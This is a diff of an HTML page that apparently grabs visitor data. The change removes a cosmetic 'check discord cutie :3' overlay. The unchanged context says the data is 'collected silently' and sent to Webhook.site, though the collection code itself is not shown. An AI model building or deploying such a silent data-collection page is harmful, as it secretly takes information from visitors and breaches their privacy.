@@ -116,29 +116,6 @@
         .full-data::-webkit-scrollbar { width: 4px; }
         .full-data::-webkit-scrollbar-track { background: #0a0a0a; }
         .full-data::-webkit-scrollbar-thumb { background: #00ff4133; border-radius: 10px; }
-        .done-overlay {
-            position: fixed;
-            inset: 0;
-            background: #0a0a0a;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.6s ease;
-            z-index: 5;
-        }
-        .done-overlay.show { opacity: 1; pointer-events: auto; }
-        .done-text {
-            font-size: 32px;
-            font-weight: 600;
-            color: #e8c547;
-            letter-spacing: 1px;
-            font-family: 'Courier New', monospace;
-            transform: translateY(20px);
-            transition: transform 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
-        }
-        .done-overlay.show .done-text { transform: translateY(0); }
         @media (max-width: 700px) {
             .dashboard { grid-template-columns: 1fr; }
             .container { padding: 16px; }
@@ -214,10 +191,6 @@
     <div class="footer">
         Data collected silently &bull; Sent to Webhook.site &bull; Educational purposes only
     </div>
-</div>
-
-<div class="done-overlay" id="overlay">
-    <div class="done-text">check discord cutie :3</div>
 </div>
 
 <script>
@@ -406,11 +379,8 @@ async function main() {
 
         statusText.innerHTML = '<span class="success">Data sent successfully!</span>';
 
-        setTimeout(() => { document.getElementById('overlay').classList.add('show'); }, 800);
-
     } catch (error) {
         statusText.innerHTML = '<span class="error">Error: '+error.message+'</span>';
-        setTimeout(() => { document.getElementById('overlay').classList.add('show'); }, 800);
     }
 }
 
